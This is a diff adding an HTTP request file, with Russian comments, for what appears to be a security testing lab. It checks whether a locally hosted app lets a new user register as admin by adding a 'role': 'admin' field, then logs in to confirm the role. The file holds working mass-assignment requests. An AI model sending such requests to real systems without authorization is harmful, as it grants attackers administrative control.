@@ -1,0 +1,47 @@
+### ======================================================================
+### СЦЕНАРИЙ 3. Privilege Escalation — регистрация администратора
+### ======================================================================
+### Приложение не должно доверять роли, которую прислал клиент.
+### Проверим, можно ли зарегистрироваться сразу как admin.
+### ----------------------------------------------------------------------
+
+@host = http://localhost:3000
+
+### Обычная регистрация (для сравнения) — роль по умолчанию "customer".
+POST {{host}}/api/Users
+Content-Type: application/json
+
+{
+  "email": "user_normal@test.local",
+  "password": "Passw0rd!123",
+  "passwordRepeat": "Passw0rd!123",
+  "securityQuestion": { "id": 1 },
+  "securityAnswer": "test"
+}
+
+### АТАКА — та же регистрация, но с добавленным полем "role": "admin".
+### Поменяйте email, чтобы не было конфликта.
+POST {{host}}/api/Users
+Content-Type: application/json
+
+{
+  "email": "fake_admin@test.local",
+  "password": "Passw0rd!123",
+  "passwordRepeat": "Passw0rd!123",
+  "role": "admin",
+  "securityQuestion": { "id": 1 },
+  "securityAnswer": "test"
+}
+
+### Проверка: войдите этим пользователем и посмотрите поле "role" в токене/ответе.
+POST {{host}}/rest/user/login
+Content-Type: application/json
+
+{
+  "email": "fake_admin@test.local",
+  "password": "Passw0rd!123"
+}
+
+### ВЫВОД в отчёт: если новый пользователь получил роль admin — приложение
+### доверяет данным клиента. Категория: A01:2025 Broken Access Control,
+### подтип Privilege Escalation / Mass Assignment.
